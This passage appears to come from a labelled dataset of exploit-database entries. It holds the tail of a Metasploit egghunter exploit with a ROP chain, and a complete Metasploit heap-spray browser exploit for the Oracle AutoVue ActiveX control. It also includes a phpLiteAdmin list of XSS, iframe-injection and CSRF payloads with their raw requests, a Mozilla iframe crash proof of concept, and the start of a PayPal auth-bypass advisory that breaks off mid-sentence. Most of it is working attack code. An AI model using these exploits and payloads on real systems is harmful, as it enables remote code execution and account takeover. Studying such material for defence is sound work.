;VirtualAllocEx db 0x95 db 0x1a db 0x6e db 0xa1                       ;WriteProcessMemory db 0x6a db 0x3d db 0xd8 db 0xdd                       ;CreateRemoteThread db 0x9c db 0xbd db 0x72                       ;Sleep db 0xB0 db 0x49 db 0x2D db 0xDB  ; sneak in ptr to string too :) db ""calc"" db 0x00 |  		migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string  		nops = make_nops(10) * 4 		thepayload = migrate << nops << payload.encoded  		eggoptions = 		{ 			:eggtag => 'w00t', 		}  		hunter, egg = generate_egghunter(thepayload, """", eggoptions)  		header  = ""\x01\x00\x00\x1e\x00\x00\x00\x01\x00\x00\x1f\xf4\x01\x00\x00\x00"" 		header << ""\x00\x00\x00\x00\xb0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 		header << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 		header << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x40""  		rop_chain = 		[ 			0x100b257b,  # POP ESP # RETN 			0x771a22e4,  # pointer in ecx -> initial ret to ret to pointer -> beg rop (thank you mona.py) 			0x10047355,  # Duplicate, readable, RETN 			0x10047355,  # POP EAX # RETN    ** [GenClientU.dll] 			0xffffffde, 			0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll] 			0x1011e33e,  # XCHG EAX,EDX # RETN 			0x1001ab22,  # POP ECX # RETN    ** [GenClientU.dll] 			0x77dd1404,  # ptr to ptr to NtSetInformationProcess()  (ADVAPI.dll, static on XP) 			0x100136c0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [GenClientU.dll]  			0x1008cfd1,  # POP EDI, POP ESI, POP EBP, POP EBX, POP ESI,RETN ** [GenClientU.dll] 			0x10080163,  # POP ESI # RETN -> EDI 			0x41414141, 			0x41414141, 			0xffffffff,  # NtCurrentProcess() (EBX) 			0x7c331d24,  # ptr to 0x2 -> ECX  			0x10090e3d,  # XCHG EAX,EBP # RETN    ** [GenClientU.dll] 			0x10047355,  # POP EAX # RETN    ** [GenClientU.dll]  			0xfffffffc, 			0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll] 			0x100dda84,  # PUSHAD # RETN    ** [GenClientU.dll] 			0x90908aeb,  # go to egghunter 		].pack('V*')  		sploit  = target['Ret'] * 180 		sploit << [0x74757677].pack('V') * 8 		sploit << ""\x77\x77"" 		sploit << hunter  #32 byte hunter, no room for checksum 		sploit << rop_chain 		sploit << make_nops(28) 		sploit << egg  		sploit << rand_text_alpha(target['Max']-sploit.length)  		connect 		print_status(""Sending request. This will take a few seconds..."") 		sock.put(header + sploit)  		handler 		disconnect  	end  end",abusing the the memory allocations needed for the number of elements passed by the client,1
20297,"Oracle AutoVue - ActiveX Control SetMarkupMode Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::Remote::Seh 	include Msf::Exploit::Remote::BrowserAutopwn  	autopwn_info({ 		:ua_name    => HttpClients::IE, 		:ua_minver  => ""6.0"", 		:ua_maxver  => ""9.0"", 		:javascript => true, 		:os_name    => OperatingSystems::WINDOWS, 		:classid    => ""{B6FCC215-D303-11D1-BC6C-0000C078797F}"", 		:method     => ""SetMarkupMode"", 		:rank       => NormalRanking 	})   	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Oracle AutoVue ActiveX Control SetMarkupMode Buffer Overflow', 			'Description'    => %q{ 					This module exploits a vulnerability found in the AutoVue.ocx ActiveX control. 				The vulnerability, due to the insecure usage of an strcpy like function in the 				SetMarkupMode method, when handling a specially crafted sMarkup argument, allows 				to trigger a stack based buffer overflow which leads to code execution under the 				context of the user visiting a malicious web page.  				The module has been successfully tested against Oracle AutoVue Desktop Version 				20.0.0 (AutoVue.ocx 20.0.0.7330) on IE 6, 7, 8 and 9 (Java 6 needed to DEP and 				ASLR bypass). 			}, 			'Author'         => 				[ 					'Brian Gorenc', # Vulnerability discovery 					'juan' # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'CVE', '2012-0549' ], 					[ 'BID', '53077' ], 					[ 'OSVDB', '81439' ], 					[ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-12-05' ], 					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process',  				}, 			'Payload'        => 				{ 					'Space' => 948, 					'DisableNops' => true, 				}, 			'DefaultOptions'  => 				{ 					'InitialAutoRunScript' => 'migrate -f' 				}, 			'Platform' => 'win', 			'Targets'        => 				[ 					# AutoVue.ocx 20.0.0.7330 					[ 'Automatic', {} ], 					[ 						'IE 6 on Windows XP SP3', 						{ 							'SprayBlocks' => 0x185, 							'SprayCounter' => '0x5f2', # 0x0c0c0c08 							'SprayOffset' => '0x600', # 0x0c0c0c24 							'Offset' => 1052, 							'Ret' => 0x0c0c0c0c, 							'Rop' => nil, 							'RandomHeap' => false 						} 					], 					[ 						'IE 7 on Windows XP SP3 / Windows Vista SP2', 						{ 							'SprayBlocks' => 0x185, 							'SprayCounter' => '0x5f2', # 0x0c0c0c08 							'SprayOffset' => '0x600', # 0x0c0c0c24 							'Offset' => 1052, 							'Ret' => 0x0c0c0c0c, 							'Rop' => nil, 							'RandomHeap' => false 						} 					], 					[ 						'IE 8 with Java 6 on Windows XP SP3/7 SP1/Vista SP2', 						{ 							'SprayBlocks' => 0x185, 							'SprayCounter' => '0x5f2', # 0x0c0c0c08 							'SprayStackPivot' => '0x5f6', # 0x0c0c0c10 							'SprayOffset' => '0x5fc', # 0x0c0c0c1c 							'Offset' => 1052, 							'Ret' => 0x0c0c0c0c, 							'Rop' => :jre, 							'RandomHeap' => false, 						} 					], 					[ 						'IE 9 with Java 6 on Windows 7 SP1', 						{ 							'SprayBlocks' => 0x1000, 							'SprayNops' => '0x5f6', # 0x0c0c0bfc 							'SprayCounter' => '0x5fc', # 0x0c0c0c08 							'SprayStackPivot' => '0x600', # 0x0c0c0c10 							'SprayOffset' => '0x606', # 0x0c0c0c1c 							'Offset' => 1052, 							'Ret' => 0x0c0c0c0c, 							'Rop' => :jre, 							'RandomHeap' => true, 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Apr 18 2012', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]) 			], self.class 		)  	end  	def get_easy_spray(t, js_code, js_nops, js_counter)  		spray = <<-JS 		var heap_obj = new heapLib.ie(0x20000); 		var code = unescape(""#{js_code}""); 		var nops = unescape(""#{js_nops}""); 		var counter = unescape(""#{js_counter}"");  		while (nops.length < 0x80000) nops += nops;  		var offset = nops.substring(0, #{t['SprayCounter']}); 		var offset_2 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length); 		var block_used = code.length + offset_2.length + counter.length + offset.length; 		var shellcode = offset + counter + offset_2  + code + nops.substring(0, 0x800 - block_used);  		while (shellcode.length < 0x40000) shellcode += shellcode; 		var block = shellcode.substring(0, (0x80000-6)/2);  		heap_obj.gc(); 		for (var z=1; z < #{t['SprayBlocks']}; z++) { 			heap_obj.alloc(block); 		}  		JS  		return spray  	end  	def get_aligned_spray(t, js_code, js_nops, js_counter, js_stack_pivot)  		spray = <<-JS 		var heap_obj = new heapLib.ie(0x20000); 		var code = unescape(""#{js_code}""); 		var nops = unescape(""#{js_nops}""); 		var counter = unescape(""#{js_counter}""); 		var stack_pivot = unescape(""#{js_stack_pivot}"")  		while (nops.length < 0x80000) nops += nops;  		var offset = nops.substring(0, #{t['SprayCounter']}); 		var offset_2 = nops.substring(0, #{t['SprayStackPivot']} - offset.length - counter.length); 		var offset_3 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length - offset_2.length - stack_pivot.length); 		var block_used = code.length + offset_3.length + stack_pivot.length + offset_2.length + counter.length + offset.length; 		var shellcode = offset + counter + offset_2  + stack_pivot + offset_3 + code + nops.substring(0, 0x800 - block_used);  		while (shellcode.length < 0x40000) shellcode += shellcode; 		var block = shellcode.substring(0, (0x80000-6)/2);  		heap_obj.gc(); 		for (var z=1; z < #{t['SprayBlocks']}; z++) { 			heap_obj.alloc(block); 		}  		JS  		return spray  	end  	# Spray published by corelanc0d3r 	# Exploit writing tutorial part 11 : Heap Spraying Demystified 	# See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/ 	def get_random_spray(t, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot)  		spray = <<-JS  		function randomblock(blocksize) 		{ 			var theblock = """"; 			for (var i = 0; i < blocksize; i++) 			{ 				theblock += Math.floor(Math.random()*90)+10; 			} 			return theblock; 		}  		function tounescape(block) 		{ 			var blocklen = block.length; 			var unescapestr = """"; 			for (var i = 0; i < blocklen-1; i=i+4) 			{ 				unescapestr += ""%u"" + block.substring(i,i+4); 			} 			return unescapestr; 		}  		var heap_obj = new heapLib.ie(0x10000);  		var code = unescape(""#{js_code}""); 		var nops = unescape(""#{js_nops}""); 		var nops_90 = unescape(""#{js_90_nops}""); 		var counter = unescape(""#{js_counter}""); 		var stack_pivot = unescape(""#{js_stack_pivot}"")  		while (nops_90.length < 0x80000) nops_90 += nops_90;  		for (var i=0; i <  #{t['SprayBlocks']}; i++) { 			var padding = unescape(tounescape(randomblock(0x1000))); 			while (padding.length < 0x1000) padding+= padding;   			var offset = padding.substring(0, #{t['SprayNops']}); 			var offset_2 = padding.substring(0, #{t['SprayCounter']} - offset.length - nops.length); 			var offset_4 = padding.substring(0, #{t['SprayOffset']} - offset.length -  nops.length - offset_2.length - counter.length - nops.length - stack_pivot.length); 			var block_used = code.length + offset_4.length + stack_pivot.length + nops.length + counter.length + offset_2.length + nops.length + offset.length; 			var single_sprayblock = offset + nops + offset_2 + counter + nops  + stack_pivot + offset_4 + code + padding.substring(0, 0x800 - block_used);  			while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock; 			sprayblock = single_sprayblock.substring(0, (0x40000-6)/2); 			heap_obj.alloc(sprayblock); 		}  		JS  		return spray 	end   	def junk(n=4) 		return rand_text_alpha(n).unpack(""V"").first 	end  	def nop 		return make_nops(4).unpack(""V"").first 	end  	# stackpivot from msvcr71.dll 	def get_stack_pivot_stage_1 		rop = [ 0x7c341ae4 ].pack(""V*"") # ADD ESP,48 # RETN 		return rop 	end  	# stackpivot from msvcr71.dll 	def get_stack_pivot_stage_2 		rop = [ 			0x7c3522ca,  # ADD EAX,20 # RETN 			0x7c348b05,  # XCHG EAX,ESP # RETN 		].pack(""V*"") 		rop = rop.gsub(/""/, ""\\\"""") 		return rop 	end  	# ROP chain (msvcr71.dll) generated by mona.py - See corelan.be 	def get_rop_chain 		rop = [ 			0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN 			0x00001000,  # (dwSize) 			0x7c347f98,  # RETN (ROP NOP) 			0x7c3415a2,  # JMP [EAX] 			0xffffffff, 			0x7c376402,  # skip 4 bytes 			0x7c345255,  # INC EBX # FPATAN # RETN 			0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN 			0x7c344f87,  # POP EDX # RETN 			0x00000040,  # flNewProtect 			0x7c34d201,  # POP ECX # RETN 			0x7c38b001,  # &Writable location 			0x7c347f97,  # POP EAX # RETN 			0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF 			0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN 			0x7c345c30,  # ptr to 'push esp #  ret ' 		].pack(""V*"")  		return rop 	end  	def get_target(agent) 		#If the user is already specified by the user, we'll just use that 		return target if target.name != 'Automatic'  		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/ 			return targets[1]  #IE 6 on Windows XP SP3 		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/ 			return targets[2]  #IE 7 on Windows XP SP3 		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/ 			return targets[2]  #IE 7 on Windows Vista SP2 		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/ 			return targets[3]  #IE 8 on Windows XP SP3 		elsif agent =~ /NT 6\.[01]/ and agent =~ /MSIE 8/ 			return targets[3]  #IE 8 on Windows 7 SP1/Vista SP2 		elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 9/ 			return targets[4]  #IE 9 on Windows 7 SP1 		else 			return nil 		end 	end  	def on_request_uri(cli, request)  		agent = request.headers['User-Agent'] 		print_status(""User-agent: #{agent}"")  		my_target = get_target(agent)  		# Avoid the attack if the victim doesn't have a setup we're targeting 		if my_target.nil? 			print_error(""Browser not supported: #{agent}"") 			send_not_found(cli) 			return 		end  		p = payload.encoded  		if my_target['Rop'].nil? 			js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch)) 		else 			js_stack_pivot = Rex::Text.to_unescape(get_stack_pivot_stage_1, Rex::Arch.endian(my_target.arch)) 			js_code = Rex::Text.to_unescape(get_rop_chain + p, Rex::Arch.endian(my_target.arch)) 		end  		js_nops = Rex::Text.to_unescape(""\x0c""*4, Rex::Arch.endian(my_target.arch)) 		js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch)) 		js_counter = Rex::Text.to_unescape(""\x01\x00\x00\x00"", Rex::Arch.endian(my_target.arch))  		js = """"  		if my_target['RandomHeap'] 			js = get_random_spray(my_target, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot) 		elsif my_target['Rop'] 			js = get_aligned_spray(my_target, js_code, js_nops, js_counter, js_stack_pivot) 		else 			js = get_easy_spray(my_target, js_code, js_nops, js_counter) 		end  		js = heaplib(js, {:noobfu => true})  		if datastore['OBFUSCATE'] 			js = ::Rex::Exploitation::JSObfu.new(js) 			js.obfuscate 		end  		if my_target['Rop'].nil? 			sploit = rand_text_alpha(my_target['Offset']) 		else 			sploit = rand_text_alpha(8) 			sploit << get_stack_pivot_stage_2 			# +1 because of the escape character in get_stack_pivot_stage_2 			sploit << rand_text_alpha(my_target['Offset'] - sploit.length + 1) 		end 		sploit << [my_target.ret].pack(""V"")  		html = <<-MYHTML 		<html> 		<head> 		<script> 		#{js} 		</script> 		</head> 		<body> 		<object classid='clsid:B6FCC215-D303-11D1-BC6C-0000C078797F' id='obj' /> 		</object> 		<script> 			setTimeout(function(){ obj.SetMarkupMode(""#{sploit}""); }, 100); 		</script> 		</body> 		</html> 		MYHTML  		html = html.gsub(/^\t\t/, '')  		print_status(""Sending html"") 		send_response(cli, html, {'Content-Type'=>'text/html'}) 	end end",a specially crafted sMarkup argument,1
39714,"phpLiteAdmin 1.9.6 - Multiple Vulnerabilities ################################################################################################################################################# # Exploit Title: phpLiteAdmin v1.9.6 - Multiple Vulnerabilities # Date: 20.04.2016 # Exploit Author: Ozer Goker # Vendor Homepage: https://www.phpliteadmin.org # Software Link: https://bitbucket.org/phpliteadmin/public/downloads/phpLiteAdmin_v1-9-6.zip # Version: 1.9.6 #################################################################################  Introduction phpLiteAdmin is a web-based SQLite database admin tool written in PHP with support for SQLite3 and SQLite2. source = https://www.phpliteadmin.org   Vulnerabilities: CSRF | HTML(or Iframe) Injection | XSS   XSS details: #################################################################################  XSS1  URL http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1  METHOD Post  PARAMETER 0_defaultoption  PAYLOAD ""><script>alert(1)</script>  Request POST /phpliteadmin/phpliteadmin.php?action=table_create&confirm=1 HTTP/1.1  tablename=testtable&rows=2&0_field=id&0_type=INTEGER&0_defaultoption=defined""><script>alert(1)</script>&0_defaultvalue=1&1_field=name&1_type=INTEGER&1_defaultoption=defined&1_defaultvalue=test  #################################################################################  XSS2  URL http://localhost/phpliteadmin/phpliteadmin.php?view=import  METHOD Post  PARAMETER file  PAYLOAD ""><script>alert(2)</script>  Request POST /phpliteadmin/phpliteadmin.php?view=import HTTP/1.1  Content-Type: multipart/form-data; boundary=---------------------------1675024292505 Content-Length: 1124  -----------------------------1675024292505 Content-Disposition: form-data; name=""import_type""  sql -----------------------------1675024292505 Content-Disposition: form-data; name=""single_table""  testtable -----------------------------1675024292505 Content-Disposition: form-data; name=""import_csv_fieldsterminated""  ; -----------------------------1675024292505 Content-Disposition: form-data; name=""import_csv_fieldsenclosed""  "" -----------------------------1675024292505 Content-Disposition: form-data; name=""import_csv_fieldsescaped""  \ -----------------------------1675024292505 Content-Disposition: form-data; name=""import_csv_replacenull""  NULL -----------------------------1675024292505 Content-Disposition: form-data; name=""import_csv_fieldnames""  on -----------------------------1675024292505 Content-Disposition: form-data; name=""file""; filename=""test"" Content-Type: text/plain  ""><script>alert(2)</script> -----------------------------1675024292505 Content-Disposition: form-data; name=""import""  Import -----------------------------1675024292505--   #################################################################################  XSS3  URL http://localhost/phpliteadmin/phpliteadmin.php?view=sql  METHOD Post  PARAMETER queryval  PAYLOAD ""><script>alert(3)</script>  Request POST /phpliteadmin/phpliteadmin.php?view=sql HTTP/1.1  queryval=%22%3E%3Cscript%3Ealert%283%29%3C%2Fscript%3E&delimiter=%3B&query=Go  #################################################################################  XSS4  URL http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1  METHOD Post  PARAMETER select  PAYLOAD ""><script>alert(4)</script>  Request POST /phpliteadmin/phpliteadmin.php?action=view_create&confirm=1 HTTP/1.1  viewname=test&select=""><script>alert(4)</script>&createtable=Go  #################################################################################  XSS5  URL http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1  METHOD Post  PARAMETER viewname  PAYLOAD <script>alert(5)</script>  Request POST /phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1 HTTP/1.1  viewname=test<script>alert(5)</script>   #################################################################################  XSS6  URL http://localhost/phpliteadmin/phpliteadmin.php?action=row_view&table=testtable  METHOD Post  PARAMETER numRows  PAYLOAD '><script>alert(6)</script>  Request POST /phpliteadmin/phpliteadmin.php?action=row_view&table=testtable HTTP/1.1  show=Show+%3A+&numRows=30%27%3E%3Cscript%3Ealert%286%29%3C%2Fscript%3E&startRow=0&viewtype=table  #################################################################################  XSS7  URL http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=column_confirm&action2=%27%3E%3Cscript%3Ealert%287%29%3C/script%3E&pk=id  METHOD Get  PARAMETER action2  PAYLOAD '><script>alert(7)</script>  #################################################################################  XSS8  URL http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1  METHOD Post  PARAMETER tablename  PAYLOAD %3cscript%3ealert(8)%3c%2fscript%3e  Request POST /phpliteadmin/phpliteadmin.php?action=table_create&confirm=1 HTTP/1.1  tablename=testtable%3cscript%3ealert(8)%3c%2fscript%3e&rows=2&0_field=id&0_type=INTEGER&0_defaultoption=defined&0_defaultvalue=1&1_field=name&1_type=INTEGER&1_defaultoption=defined&1_defaultvalue=test  #################################################################################  XSS9  URL http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1  METHOD Post  PARAMETER oldname  PAYLOAD <script>alert(9)</script>  Request POST /phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1 HTTP/1.1  oldname=testtable<script>alert(9)</script>&newname=test&rename=Rename  #################################################################################   HTML Injection details: #################################################################################  HTML Injection1  URL http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1 METHOD Post  PARAMETER 0_defaultoption  PAYLOAD ""><iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection2  URL http://localhost/phpliteadmin/phpliteadmin.php?view=import  METHOD Post  PARAMETER file  PAYLOAD ""><iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection3  URL http://localhost/phpliteadmin/phpliteadmin.php?view=sql  METHOD Post  PARAMETER queryval  PAYLOAD ""><iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection4  URL http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1  METHOD Post  PARAMETER select  PAYLOAD ""><iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection5  URL http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1  METHOD Post  PARAMETER viewname  PAYLOAD <iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection6  URL http://localhost/phpliteadmin/phpliteadmin.php?action=row_view&table=testtable  METHOD Post  PARAMETER numRows  PAYLOAD '><iframe src=https://www.phpliteadmin.org>   #################################################################################  HTML Injection7  URL http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=column_confirm&action2=%27%3E%3Ciframe%20src=https://www.phpliteadmin.org%3E&pk=id  METHOD Get  PARAMETER action2  PAYLOAD '><iframe src=https://www.phpliteadmin.org>  #################################################################################  HTML Injection8  URL http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1  METHOD Post  PARAMETER oldname  PAYLOAD <iframe src=https://www.phpliteadmin.org>  #################################################################################   CSRF details:  #################################################################################  CSRF1  Create Database  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php"" method=""POST""> <input type=""text"" name=""new_dbname"" value=""db""/> <input type=""submit"" value=""Create DB""/> </form> </body> </html>  #################################################################################  CSRF2  Drop Database  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?database_delete=1"" method=""POST""> <input type=""text"" name=""database_delete"" value="".\db""/> <input type=""submit"" value=""Drop DB""/> </form> </body> </html>  #################################################################################  CSRF3  Execute SQL  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php?view=sql"" method=""POST""> <input type=""text"" name=""queryval"" value=""test""/> <input type=""text"" name=""delimiter"" value="";""/> <input type=""text"" name=""query"" value=""go""/> <input type=""submit"" value=""Execute SQL""/> </form> </body> </html>  #################################################################################  CSRF4  Export DB  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php?view=export"" method=""POST""> <input type=""text"" name=""tables[]"" value=""testtable""/> <input type=""text"" name=""export_type"" value=""sql""/> <input type=""text"" name=""structure"" value=""on""/> <input type=""text"" name=""data"" value=""on""/> <input type=""text"" name=""transaction"" value=""on""/> <input type=""text"" name=""comments"" value=""on""/> <input type=""text"" name=""export_csv_fieldsterminated"" value="";""/> <input type=""text"" name=""export_csv_fieldsenclosed"" value=""""""/> <input type=""text"" name=""export_csv_fieldsescaped"" value=""\""/> <input type=""text"" name=""export_csv_replacenull"" value=""NULL""/> <input type=""text"" name=""export_csv_fieldnames"" value=""on""/> <input type=""text"" name=""filename"" value=""db_2016-04-20.dump""/> <input type=""text"" name=""export"" value=""Export""/> <input type=""submit"" value=""Export DB""/> </form> </body> </html>  #################################################################################  CSRF5  Download Database  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php"" method=""GET""> <input type=""text"" name=""download"" value="".\db""/> <input type=""submit"" value=""Download DB""/> </form> </body> </html>  #################################################################################  CSRF6  Import Table  URL http://localhost/phpliteadmin/phpliteadmin.php?view=import  Request POST /phpliteadmin/phpliteadmin.php?view=import HTTP/1.1  Content-Type: multipart/form-data; boundary=---------------------------28282942824983 Content-Length: 1410  -----------------------------28282942824983 Content-Disposition: form-data; name=""import_type""  sql -----------------------------28282942824983 Content-Disposition: form-data; name=""import_csv_fieldsterminated""  ; -----------------------------28282942824983 Content-Disposition: form-data; name=""import_csv_fieldsenclosed""  "" -----------------------------28282942824983 Content-Disposition: form-data; name=""import_csv_fieldsescaped""  \ -----------------------------28282942824983 Content-Disposition: form-data; name=""import_csv_replacenull""  NULL -----------------------------28282942824983 Content-Disposition: form-data; name=""import_csv_fieldnames""  on -----------------------------28282942824983 Content-Disposition: form-data; name=""file""; filename=""db_2016-04-20.dump.sql"" Content-Type: text/sql  ---- -- phpLiteAdmin database dump (https://bitbucket.org/phpliteadmin/public) -- phpLiteAdmin version: 1.9.6 -- Exported: 12:50am on April 20, 2016 (BST) -- database file: .\db ---- BEGIN TRANSACTION;  ---- -- Table structure for testtable ---- CREATE TABLE 'testtable' ('id' INTEGER DEFAULT 1 );  ---- -- Data dump for testtable, a total of 1 rows ---- INSERT INTO ""testtable"" (""id"") VALUES ('1'); COMMIT;  -----------------------------28282942824983 Content-Disposition: form-data; name=""import""  Import -----------------------------28282942824983--  #################################################################################  CSRF7  Database Vacuum  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php?view=vacuum"" method=""POST""> <input type=""text"" name=""vacuum"" value=""Vacuum""/> <input type=""submit"" value=""DB Vacuum""/> </form> </body> </html>  #################################################################################  CSRF8  Database Rename  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?view=rename&database_rename=1"" method=""POST""> <input type=""text"" name=""oldname"" value="".\db1""/> <input type=""text"" name=""newname"" value="".\db""/> <input type=""text"" name=""rename"" value=""Rename""/> <input type=""submit"" value=""DB Rename""/> </form> </body> </html>  #################################################################################  CSRF9  Create Table  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1"" method=""POST""> <input type=""text"" name=""tablename"" value=""testtable""/> <input type=""text"" name=""rows"" value=""1""/> <input type=""text"" name=""0_field"" value=""id""/> <input type=""text"" name=""0_type"" value=""INTEGER""/> <input type=""text"" name=""0_defaultoption"" value=""defined""/> <input type=""text"" name=""0_defaultvalue"" value=""1""/> <input type=""submit"" value=""Create Table""/> </form> </body> </html>  #################################################################################  CSRF10  Insert Table  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=row_create&confirm=1""   method=""POST""> <input type=""text"" name=""numRows"" value=""1""/> <input type=""text"" name=""function_0_id"" value=""""/> <input type=""text"" name=""0:id"" value=""1""/> <input type=""text"" name=""fields"" value=""id""/> <input type=""submit"" value=""Insert Table""/> </form> </body> </html>  #################################################################################  CSRF11  Row Delete  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=row_delete&confirm=1&pk=%5B  %22%5B1%5D%22%5D"" method=""POST""> <input type=""submit"" value=""Row Delete""/> </form> </body> </html>  #################################################################################  CSRF12  Search Field  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=table_search&done=1""   method=""POST""> <input type=""text"" name=""id:operator"" value=""=""/> <input type=""text"" name=""id"" value=""1""/> <input type=""submit"" value=""Search Field""/> </form> </body> </html>  #################################################################################  CSRF13  Rename Table  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1"" method=""POST""> <input type=""text"" name=""oldname"" value=""test""/> <input type=""text"" name=""newname"" value=""testtable""/> <input type=""text"" name=""rename"" value=""Rename""/> <input type=""submit"" value=""Rename Table""/> </form> </body> </html>  #################################################################################  CSRF14  Empty Table  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=table_empty&confirm=1"" method=""POST""> <input type=""text"" name=""tablename"" value=""testtable""/> <input type=""submit"" value=""Empty Table""/> </form> </body> </html>  #################################################################################  CSRF15  Drop Table  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=table_drop&confirm=1"" method=""POST""> <input type=""text"" name=""tablename"" value=""testtable""/> <input type=""submit"" value=""Drop Table""/> </form> </body> </html>  #################################################################################  CSRF16  Create View  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1"" method=""POST""> <input type=""text"" name=""viewname"" value=""test""/> <input type=""text"" name=""select"" value=""select * from testtable;""/> <input type=""text"" name=""createtable"" value=""go""/> <input type=""submit"" value=""Create View""/> </form> </body> </html>  #################################################################################  CSRF17  Drop View  <html> <body> <form action="" http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1"" method=""POST""> <input type=""text"" name=""viewname"" value=""test""/> <input type=""submit"" value=""Drop View""/> </form> </body> </html>  #################################################################################  CSRF18  Logout  <html> <body> <form action=""http://localhost/phpliteadmin/phpliteadmin.php"" method=""POST""> <input type=""hidden"" name=""logout"" value=""Logout""/> <input type=""submit"" value=""Logout""/> </form> </body> </html>  #################################################################################",any malicious use,1
24799,"Mozilla0.x / Netscape 3/4 / Firefox 1.0 - JavaScript IFRAME Rendering Denial of Service source: https://www.securityfocus.com/bid/11823/info  Mozilla/Netscape and Firefox browsers are reported prone a remote denial of service vulnerability. It is reported that the affected browsers will crash as a result of a NULL pointer dereference when a JavaScript function attempts to print an IFRAME that is embedded in the page.  Replace '[' with '<' and ']' with '>'. [iframe id=""pocframe"" name=""pocframe"" src=""about:blank""></iframe] [script type=""text/javascript"">window.frames.pocframe.print();</script]",malformed network communications,1
34957,"PayPal Inc BB #85 MB iOS 4.6 - Authentication Bypass Document Title: =============== PayPal Inc BB #85 MB iOS 4.6 - Auth Bypass Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=895  PayPal Security UID: Vxda0S  Video: http://www.vulnerability-lab.com/get_content.php?id=1338  View: https://www.youtube.com/watch?v=RXubXP_r2M4   Release Date: ============= 2014-10-09   Vulnerability Laboratory ID (VL-ID): ==================================== 895   Common Vulnerability Scoring System: ==================================== 6.2   Product & Service Introduction: =============================== PayPal is a global e-commerce business allowing payments and money transfers to be made through the Internet. Online money  transfers serve as electronic alternatives to paying with traditional paper methods, such as checks and money orders. Originally,  a PayPal account could be funded with an electronic debit from a bank account or by a credit card at the payer s choice. But some  time in 2010 or early 2011, PayPal began to require a verified bank account after the account holder exceeded a predetermined  spending limit. After that point, PayPal will attempt to take funds for a purchase from funding sources according to a specified  funding hierarchy. If you set one of the funding sources as Primary, it will default to that, within that level of the hierarchy  (for example, if your credit 